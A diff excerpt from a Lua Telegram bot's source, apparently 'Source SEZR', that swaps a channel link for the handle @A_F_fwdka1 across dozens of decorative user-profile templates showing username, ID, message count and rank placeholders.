 ⭐️𝖎𝖉 : #id ـ 🍭
-⭐️𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+⭐️𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 • 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
 • ??🇬 - 𝙸𝙳 « #id  🍭
 • 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
 • 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
-• 🇪?? - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+• 🇪?? - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 • USE ➤  #username .
 • MSG ➤  #msgs .
 • STA ➤  #stast .
 • iD ➤ #id .
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
@@ -16023,7 +16028,7 @@ local List = {
 🇪?? - 𝄬 ᴵᴰ . #id 𓃠
 🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
 🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
-??🇬 - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+??🇬 - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
@@ -16031,14 +16036,14 @@ local List = {
 𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
 𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
 𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
-𓄼🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𓄼🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 Usᴇʀ Nᴀᴍᴇ ~ #username 
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
@@ -16046,7 +16051,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 Id . #id 𖠲
 - 🇪🇬 GaMeS . #game 𖠲
 - 🇪🇬 MsGs . #msgs 𖠲
-- 🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ??🇬 - 𝄬 username . #username  𓃠
@@ -16054,7 +16059,7 @@ Msᴀɢ ~ #msgs
 🇪🇬 - ?? id . #id 𓃠
 🇪🇬 - 𝄬 gmas . #gmas 𓃠
 🇪🇬 - 𝄬 msgs . #msgs  𓃠
-🇪?? - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+🇪?? - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
@@ -16062,28 +16067,28 @@ Msᴀɢ ~ #msgs
 金 - 𝓲𝓭 . #id ⸙ 
 金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
 金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
-金 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+金 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ➜𝗨𝗦??𝗥𝗡𝗔𝗠𝗘 : #username
 ➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
 ➜𝗦𝗧𝗔𝗧𝗦 : #stast
 ➜𝗜𝗗 : #id
-➜𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+➜𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ⌔┇Msgs : #msgs.
 ⌔┇ID : #id.
 ⌔┇Stast : #stast.
 ⌔┇UserName : #username.
-⌔┇𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+⌔┇𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
 𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
-𓂅 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+𓂅 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 - 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
@@ -16091,7 +16096,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 𝐢𝐝 . #id 𖣂.
 - 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
 - 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
-- 🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+- 🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
@@ -16099,7 +16104,7 @@ Msᴀɢ ~ #msgs
 ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
 ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
 ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
-ᯓ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+ᯓ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
@@ -16107,14 +16112,14 @@ Msᴀɢ ~ #msgs
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
 .𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
-.𖣂 𝗖𝗛 - ↝https://t.me/surccesezr↜ ??.
+.𖣂 𝗖𝗛 - ↝@A_F_fwdka1↜ ??.
 ]],
 [[
 ➥• USE 𖦹 #username - 🇪🇬.
 ➥• MSG 𖥳 #msgs  - 🇪🇬.
 ➥• STA 𖦹 #stast - 🇪🇬.
 ➥• iD 𖥳 #id - 🇪🇬.
-➥• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+➥• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
@@ -16122,14 +16127,14 @@ Msᴀɢ ~ #msgs
 👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
 👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
 👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
-👳🏼‍♂ - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+👳🏼‍♂ - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
 ➮- 𝐮𝐬𝐞??𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
-➭- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+➭- 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
@@ -16137,7 +16142,7 @@ Msᴀɢ ~ #msgs
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊 
 𓐀 ??𝒆𝒍𝒄𝒐𝒎𝒆 𓀃.
-𓄼 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𓄼 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
@@ -16146,7 +16151,7 @@ Msᴀɢ ~ #msgs
 𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
 𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
 𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
-𝐓𝐓• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𝐓𝐓• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 𝟓 𝟔 𖡻 #username  ࿇🦄
@@ -16154,7 +16159,7 @@ Msᴀɢ ~ #msgs
 𝟓 𝟔 𖡻 #auto  ࿇🦄
 𝟓 𝟔 𖡻 #stast  ࿇🦄
 𝟓 𝟔 𖡻 #id  ࿇🦄
-𝟓 𝟔 𖡻 𝗖𝗛 - ↝https://t.me/surccesezr↜ 💞.
+𝟓 𝟔 𖡻 𝗖𝗛 - ↝@A_F_fwdka1↜ 💞.
 ]],
 [[
 ༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
@@ -16164,7 +16169,7 @@ Msᴀɢ ~ #msgs
 • |𝗠𝗦𝗚  ⁞ #edit
 • |𝗔𝗨𝗧𝗢 ⁞ #auto
 —————————————
-𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 .
+𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 .
 ]],
 [[
 ┄─━━𖦹━━─┄
@@ -16175,14 +16180,14 @@ Msᴀɢ ~ #msgs
 𖣰𖡻 𖡋𝗔𝗨𝗧𝗢• #auto •𓀎
 𖣰𖡻 𖡋𝗘𝗗𝗜𝗧• #edit • 𓀎
 ┄─━━𖦹━━─┄
-𝗖𝗛 - ↝https://t.me/surccesezr↜  𖦹 .
+𝗖𝗛 - ↝@A_F_fwdka1↜  𖦹 .
 ]],
 [[
 𖤍 |↶ #id    ꙰🇪🇬.
 𖤍 |↶ #username    ꙰🇪🇬.
 𖤍 |↶ #msgs    ꙰🇪🇬.
 𖤍 |↶ #stast    ꙰🇪🇬.
-𖤍 |↶ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𖤍 |↶ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -16191,7 +16196,7 @@ Msᴀɢ ~ #msgs
  𝗦𝗧𝗔 ⟿ #stast  « 
  𝗜𝗗  ⟿ #id  « 
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 🇪🇬≪💎≫ #username • メ
@@ -16199,21 +16204,21 @@ Msᴀɢ ~ #msgs
 🇪🇬≪💎≫ #id  • メ
 🇪🇬≪💎≫ #msgs  •メ
 🇪🇬≪💎≫ #game •メ
-🇪🇬𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🇪🇬𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
  𝚄𝚂𝙴?? 𓄹𓄼 #username
  𝙸𝙳  𓄹𓄼 #id 
  𝚂𝚃𝙰 𓄹𓄼 #stast 
  𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
 𓅓➪ : Iᗪ : #id - ❦ . 
 𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
 𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
-𓅓➪ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓅓➪ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - ايديڪ  ⁞ #id 💘 ٬
@@ -16221,14 +16226,14 @@ Msᴀɢ ~ #msgs
 - رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
 - رتبتڪ الحلوه ⁞ #stast  💘٬
 - سحڪاتڪ الفول ⁞ #edit 💘 ٬
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
 𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
 𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
 𓁷 - 𝙞𝙙 †: #id 𓀀 .
-𓁷 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓁷 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𖡋 𝐔𝐒𝐄 #username 
@@ -16236,7 +16241,7 @@ Msᴀɢ ~ #msgs
 𖡋 𝐒𝐓𝐀 #stast 
 𖡋 𝐈𝐃 #id 
 𖡋 𝐄𝐃𝐈𝐓 #edit
-𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
@@ -16244,7 +16249,7 @@ Msᴀɢ ~ #msgs
 𖤂 ~ 𝑠𝑡𝑎 #stast  
 𖤂 ~ 𝑖𝑑 #id 𖤐
 𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
-𖤂 ~ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𖤂 ~ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 -↯   𝚄??𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
@@ -16252,7 +16257,7 @@ Msᴀɢ ~ #msgs
 -↯   𝙸𝙳 . #id 🇪🇬 ꙰ 
 -↯   𝙶𝙼𝙰𝚂 . #stast ???? ꙰ 
 -↯   𝙼??𝙶𝚂 . #msgs 🇪🇬 ꙰
--↯   𝗖𝗛 - ↝https://t.me/surccesezr↜ 🇪?? ꙰.
+-↯   𝗖𝗛 - ↝@A_F_fwdka1↜ 🇪?? ꙰.
 ]],
 [[
 ••• ••• ••• ••• ••• ••• ••• 
@@ -16261,21 +16266,21 @@ Msᴀɢ ~ #msgs
  ࿕|• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
  ࿕|• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
 ••• ••• ••• ••• ••• ••• •••
- ࿕|• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ ࿕|• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜?? #id 𓃚 ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+► 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - UsEr🇪🇬 ꙰ #username
 - StA🇪🇬 ꙰   #msgs
 - MsGs🇪🇬 ꙰ #stast
 - ID🇪🇬 ꙰  #id
-- 𝗖𝗛 🇪🇬 ꙰  ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 🇪🇬 ꙰  ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -16284,14 +16289,14 @@ Msᴀɢ ~ #msgs
 ??🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
 🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🇪🇬 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
 - 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
 - 𓏬 𝐒𝐭𝐀 : #stast ?? .
 - 𓏬 𝐈𝐃 : #id 𓂅 .
-- 𓏬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𓏬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
@@ -16299,28 +16304,28 @@ Msᴀɢ ~ #msgs
 ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
 ᯓ 𝟔𝟔𝟔?? #msgs  •✟ 
 ᯓ 𝟔𝟔𝟔𖡋 #game •✟
-ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
  🌕 •𝐮𝐬𝐞𝐫 : #username 𖣬  
  🌕 •𝐦𝐬𝐠  : #msgs 𖣬 
  🌕 •𝐬𝐭𝐚 : #stast 𖣬 
  🌕 •𝐢𝐝  : #id 𖣬
- 🌕 •𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ 🌕 •𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
 - ᴍѕɢѕ ➣ #msgs .
 - ѕᴛᴀᴛѕ ➣ #stast .
 - ʏᴏᴜʀ ɪᴅ ➣ #id  .
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - ᴜѕʀ: #username ঌ.
 - ᴍѕɢ: #msgs  ঌ.
 - ѕᴛᴀ: #stast  ঌ.
 - ɪᴅ: #id ঌ.
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
@@ -16328,14 +16333,14 @@ Msᴀɢ ~ #msgs
 - 𝑖𝑑 ⟿ #id
 - 𝑒𝑑𝑖𝑡 ⟿ #edit
 - 𝑔𝑎𝑚𝑒 ⟿ #game
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 🌯|✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
 🌯|✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
 🌯|✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
 🌯|✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
-🌯| 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🌯| 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
@@ -16344,28 +16349,28 @@ Msᴀɢ ~ #msgs
 🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
 🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
-🇪🇬 ꙰  - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🇪🇬 ꙰  - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+⌔➺: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 |• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
 |• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
 |• 𝚁𝙰𝙽??  ⇉⁞ #stast  ↝🇪🇬.
 |• 𝙸?? 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
-|• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+|• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
 ➞: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➸💞.
 ➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
 ➞: ??𝒅 𓂅 #id 𓍯➸💞.
-➞: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+➞: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ➼ : 𝐼𝐷 𖠀 #id . ♡
@@ -16373,14 +16378,14 @@ Msᴀɢ ~ #msgs
 ➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
 ➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
 ➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
-➼ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+➼ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ▽|❀• USER ➭ ⁞ #username .
 ▽|❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
 ▽|❀• STAT ➬ ⁞ #stast  .
 ▽|❀• 𝙸𝙳  ➬ ⁞ #id  .
-▽|❀• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+▽|❀• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
@@ -16388,14 +16393,14 @@ Msᴀɢ ~ #msgs
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
 • ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
-• ❉ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• ❉ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 |USERNAME #username 𓃚
 | YOUR -ID - #id 𓃚
 | STAS-#stast 𓃚
  | MSAG - #msgs 𓃚
- | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𝟔𝟔𝟔 𖡋 #username • 𖣰💞
@@ -16403,14 +16408,14 @@ Msᴀɢ ~ #msgs
 𝟔??𝟔 𖡋 #id • 𖣰💞
 𝟔𝟔𝟔 𖡋 #game • 𖣰💞
 𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
-𝟔𝟔𝟔 𖡋 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𝟔𝟔𝟔 𖡋 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ⌔➺: Msgs : #msgs - 🔹.
 ⌔➺: ID : #id - 🔹.
 ⌔➺: Stast : #stast -🔹.
 ⌔➺: UserName : #username -🔹.
-⌔➺: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+⌔➺: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
  🌕 - 𝓾𝓼𝓮𝓻 ➪ #username 🌕 .
@@ -16418,42 +16423,42 @@ Msᴀɢ ~ #msgs
  🌕 - 𝓲𝓭 ➪ #id ⸙ 🌕 .
  🌕 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙ 🌕 .
  🌕 - 𝓶𝓼𝓰𝓼 ➪ #msgs 🌕 .
- 🌕 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ 🌕 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
 ◣: 𝐮𝐬??𝐫𓂅 #username 𓍯➥♡.
 ◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
 ◣: 𝐢?? 𓂅 #id 𓍯➥♡.
-◣: 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+◣: 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - 𝄬 username . #username ➪🇪🇬
  - 𝄬 stast . #stast ➪🇪🇬
  - 𝄬 id . #id ➪🇪🇬
  - 𝄬 msgs . #msgs ➪🇪🇬
- - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ↣• USE ➤ #username  ↝🍬.
 ↣• MSG ➤  #msgs  ↝🍬.
 ↣• STA ➤  #stast  ↝🍬.
 ↣• iD ➤ #id  ↝🍬.
-↣• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🍬
+↣• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🍬
 ]],
 [[
 ➫✿: S #stast 𓍯➟♡.
 ➫✿: U𓂅 #username 𓍯➟♡.
 ➫✿: M𓂅 #msgs 𓍯➟♡.
 ➫✿:  I  #id ➟♡.
-➫✿: 𝗖?? - ↝https://t.me/surccesezr↜ ♡.
+➫✿: 𝗖?? - ↝@A_F_fwdka1↜ ♡.
 ]],
 [[
 ✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
-✶- 𝗖𝗛 - ↝https://t.me/surccesezr↜ ↝❃.
+✶- 𝗖𝗛 - ↝@A_F_fwdka1↜ ↝❃.
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 :  #username
@@ -16464,21 +16469,21 @@ Msᴀɢ ~ #msgs
 
 • 🖤 | 𝑴𝑺𝑮 : #msgs
 
-• 🖤 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 🖤 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • USE 𖦹 #username 
 • MSG 𖥳 #msgs  
 • STA 𖦹 #stast 
 • iD 𖥳 #id
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
-🌨𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘Use ⇨ #username 🌨
-🌨𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘iD ⇨ #id 🌨
-🌨𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘Sta ⇨  #stast 🌨
-🌨𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘Msg ⇨ #msgs 🌨
-🌨𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘NaMe ⇨ #name  🌨
+🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺Use ⇨ #username 🌨
+🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺iD ⇨ #id 🌨
+🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺Sta ⇨  #stast 🌨
+🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺Msg ⇨ #msgs 🌨
+🌨⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺NaMe ⇨ #name  🌨
 ]],
 [[
 - ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
@@ -16488,7 +16493,7 @@ Msᴀɢ ~ #msgs
 - ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
 - ᴅᴇᴛᴀɪʟs ➣ #auto . 
